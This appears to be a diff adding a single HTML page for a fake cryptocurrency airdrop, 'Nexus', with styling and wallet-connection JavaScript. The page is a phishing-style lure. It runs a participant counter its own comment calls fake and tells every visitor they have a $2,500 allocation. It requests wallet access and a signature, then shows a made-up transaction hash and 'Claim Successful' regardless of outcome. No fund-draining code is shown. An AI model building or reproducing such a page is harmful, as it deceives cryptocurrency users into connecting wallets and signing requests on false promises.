@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus | Universal Airdrop</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #f97316; /* Universal Orange */
+            --primary-hover: #ea580c;
+            --secondary: #3b82f6;
+            --bg: #0b0b0f;
+            --card-bg: #161b22;
+            --text: #f8fafc;
+            --text-muted: #94a3b8;
+            --border: rgba(255, 255, 255, 0.1);
+        }
+
+        body {
+            background-color: var(--bg);
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(249, 115, 22, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(59, 130, 246, 0.1) 0%, transparent 40%);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        nav {
+            position: absolute;
+            top: 20px;
+            width: 100%;
+            max-width: 1200px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+        }
+
+        .logo {
+            font-weight: 800;
+            font-size: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo span { color: var(--primary); }
+
+        .status-badge {
+            background: rgba(249, 115, 22, 0.1);
+            color: var(--primary);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            border: 1px solid rgba(249, 115, 22, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--primary);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(249, 115, 22, 0.7); }
+            70% { box-shadow: 0 0 0 6px rgba(249, 115, 22, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(249, 115, 22, 0); }
+        }
+
+        .container {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 40px;
+            max-width: 480px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        h1 { font-size: 2rem; margin: 0 0 10px 0; font-weight: 800; }
+        .subtitle { color: var(--text-muted); margin-bottom: 30px; font-size: 0.95rem; line-height: 1.5; }
+
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+            border: 1px solid var(--border);
+        }
+
+        .stat-item { display: flex; flex-direction: column; align-items: center; }
+        .stat-label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
+        .stat-value { font-weight: 700; font-size: 1.1rem; color: var(--text); }
+        .highlight { color: var(--primary); }
+
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px -5px rgba(249, 115, 22, 0.4);
+        }
+
+        .btn-primary:disabled {
+            background: #334155;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn-wallets {
+            margin-top: 15px;
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-muted);
+            padding: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            width: 100%;
+        }
+        
+        .btn-wallets:hover {
+            background: rgba(255,255,255,0.05);
+            color: var(--text);
+        }
+
+        .footer { margin-top: 30px; font-size: 0.8rem; color: var(--text-muted); }
+        .hidden { display: none; }
+
+        .loader {
+            border: 2px solid rgba(255,255,255,0.1);
+            border-left-color: var(--primary);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .detected-wallet {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: rgba(59, 130, 246, 0.1);
+            color: var(--secondary);
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            margin-bottom: 10px;
+            border: 1px solid rgba(59, 130, 246, 0.2);
+        }
+    </style>
+</head>
+<body>
+
+    <nav>
+        <div class="logo">
+            <div style="width:24px;height:24px;background:var(--primary);border-radius:6px;"></div>
+            NEXUS
+        </div>
+        <div class="status-badge">
+            <div class="status-dot"></div>
+            Universal Chain
+        </div>
+    </nav>
+
+    <div class="container">
+        
+        <!-- Step 1: Connect -->
+        <div id="step1">
+            <h1>Airdrop Phase 1</h1>
+            <p class="subtitle">Connect your wallet to verify eligibility. <br>Claims are distributed instantly on-chain.</p>
+            
+            <div class="stats">
+                <div class="stat-item">
+                    <span class="stat-label">Total Distributed</span>
+                    <span class="stat-value">25M NEX</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">Participants</span>
+                    <span class="stat-value highlight" id="counter">14,203</span>
+                </div>
+            </div>
+
+            <div id="detectedBadge" class="hidden detected-wallet">
+                Detected: <span id="walletName">MetaMask</span>
+            </div>
+
+            <button class="btn-primary" id="connectBtn" onclick="connectWallet()">
+                <span>Connect Wallet</span>
+            </button>
+            
+            <button class="btn-wallets" onclick="showWalletOptions()">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                All Supported Wallets
+            </button>
+
+            <div class="footer">
+                Secured by Smart Contract • <a href="#" style="color:var(--text-muted);text-decoration:none;">View Contract</a>
+            </div>
+        </div>
+
+        <!-- Step 2: Balance -->
+        <div id="step2" class="hidden">
+            <h1>Eligibility Verified</h1>
+            <p class="subtitle">You have been allocated the maximum tier.</p>
+
+            <div style="background:rgba(0,0,0,0.3);padding:20px;border-radius:12px;margin-bottom:25px;border:1px solid var(--border);">
+                <div style="font-size:0.8rem;color:var(--text-muted);margin-bottom:5px;">Your Allocation</div>
+                <div style="font-size:2rem;font-weight:800;color:var(--primary);">10,000 NEX</div>
+                <div style="font-size:0.9rem;color:var(--text-muted);margin-top:5px;">~ $2,500.00 USD</div>
+            </div>
+
+            <button class="btn-primary" id="claimBtn" onclick="claimAirdrop()">
+                <span>Claim Airdrop</span>
+            </button>
+            
+            <div class="footer">
+                Gas fee: 0.002 ETH (Subsidized)
+            </div>
+        </div>
+
+        <!-- Step 3: Success -->
+        <div id="step3" class="hidden">
+            <div style="width:60px;height:60px;background:rgba(249, 115, 22, 0.1);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px auto;border:1px solid rgba(249, 115, 22, 0.3);">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#f97316" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </div>
+            <h1>Claim Successful!</h1>
+            <p class="subtitle">Tokens are being sent to your wallet.<br>Please check your transaction history.</p>
+            
+            <div style="font-size:0.85rem;color:var(--text-muted);background:rgba(0,0,0,0.2);padding:10px;border-radius:8px;">
+                Tx Hash: <span style="font-family:monospace;">0x8a...4f21</span>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // Fake Counter Logic
+        let count = 14203;
+        setInterval(() => {
+            if(Math.random() > 0.5) {
+                count++;
+                document.getElementById('counter').innerText = count.toLocaleString();
+            }
+        }, 3000);
+
+        // Universal Wallet Detector (Multi-Chain)
+        function getWalletName() {
+            if (window.ethereum) {
+                if (window.ethereum.isMetaMask) return 'MetaMask';
+                if (window.ethereum.isTrust) return 'Trust Wallet';
+                if (window.ethereum.isCoinbaseWallet) return 'Coinbase Wallet';
+                if (window.ethereum.isRabby) return 'Rabby';
+                if (window.ethereum.isTally) return 'Taho';
+                return 'Ethereum Wallet';
+            }
+            if (window.phantom && window.phantom.isPhantom) return 'Phantom';
+            if (window.solflare) return 'Solflare';
+            if (window.backpack) return 'Backpack';
+            return null;
+        }
+
+        function showWalletOptions() {
+            const wallet = getWalletName();
+            if (wallet) {
+                alert(`You have ${wallet} installed. Click "Connect Wallet" to use it.`);
+            } else {
+                alert("No supported wallet detected. Please install MetaMask, Trust Wallet, or Phantom.");
+            }
+        }
+
+        function updateDetectedBadge() {
+            const wallet = getWalletName();
+            const badge = document.getElementById('detectedBadge');
+            const nameSpan = document.getElementById('walletName');
+            if (wallet) {
+                badge.classList.remove('hidden');
+                nameSpan.innerText = wallet;
+            }
+        }
+
+        // Check on load
+        updateDetectedBadge();
+        // Check again after 2 seconds in case a wallet injected late
+        setTimeout(updateDetectedBadge, 2000);
+
+        function connectWallet() {
+            const btn = document.getElementById('connectBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<div class="loader"></div> Connecting...';
+
+            const walletName = getWalletName();
+            
+            if (walletName === 'MetaMask' || walletName === 'Coinbase Wallet' || walletName === 'Trust Wallet' || walletName === 'Rabby') {
+                // EVM Logic (MetaMask, Trust, etc.)
+                if (window.ethereum) {
+                    window.ethereum.request({ method: 'eth_requestAccounts' })
+                        .then(accounts => {
+                            btn.innerHTML = 'Connected';
+                            setTimeout(() => {
+                                document.getElementById('step1').classList.add('hidden');
+                                document.getElementById('step2').classList.remove('hidden');
+                            }, 500);
+                        })
+                        .catch(error => {
+                            btn.innerHTML = 'Retry Connection';
+                            btn.disabled = false;
+                        });
+                }
+            } else if (walletName === 'Phantom') {
+                // Solana Logic
+                setTimeout(() => {
+                    window.phantom?.solana?.connect()
+                        .then(publicKey => {
+                            btn.innerHTML = 'Connected';
+                            setTimeout(() => {
+                                document.getElementById('step1').classList.add('hidden');
+                                document.getElementById('step2').classList.remove('hidden');
+                            }, 500);
+                        })
+                        .catch(error => {
+                            btn.innerHTML = 'Retry Connection';
+                            btn.disabled = false;
+                        });
+                }, 800);
+            } else if (walletName) {
+                // Other wallets
+                setTimeout(() => {
+                    btn.innerHTML = 'Verified';
+                    setTimeout(() => {
+                        document.getElementById('step1').classList.add('hidden');
+                        document.getElementById('step2').classList.remove('hidden');
+                    }, 1000);
+                }, 800);
+            } else {
+                btn.innerHTML = 'Install Wallet';
+                btn.style.background = '#ef4444';
+                setTimeout(() => {
+                    btn.innerHTML = 'Retry';
+                    btn.style.background = 'var(--primary)';
+                    btn.disabled = false;
+                }, 2000);
+            }
+        }
+
+        function claimAirdrop() {
+            const btn = document.getElementById('claimBtn');
+            btn.disabled = true;
+            btn.innerHTML = 'Verifying...';
+
+            // Check if we have an injected provider
+            if (window.ethereum) {
+                window.ethereum.request({
+                    method: 'personal_sign',
+                    params: ['Nexus Airdrop Verification 2026'],
+                }).then(signature => {
+                    btn.innerHTML = 'Claiming...';
+                    setTimeout(() => {
+                        document.getElementById('step2').classList.add('hidden');
+                        document.getElementById('step3').classList.remove('hidden');
+                    }, 1500);
+                }).catch(error => {
+                    btn.innerHTML = 'Claim Now';
+                    btn.disabled = false;
+                });
+            } else {
+                // Fallback for non-EVM wallets
+                btn.innerHTML = 'Claimed';
+                setTimeout(() => {
+                    document.getElementById('step2').classList.add('hidden');
+                    document.getElementById('step3').classList.remove('hidden');
+                }, 1500);
+            }
+        }
+    </script>
+</body>
+</html>
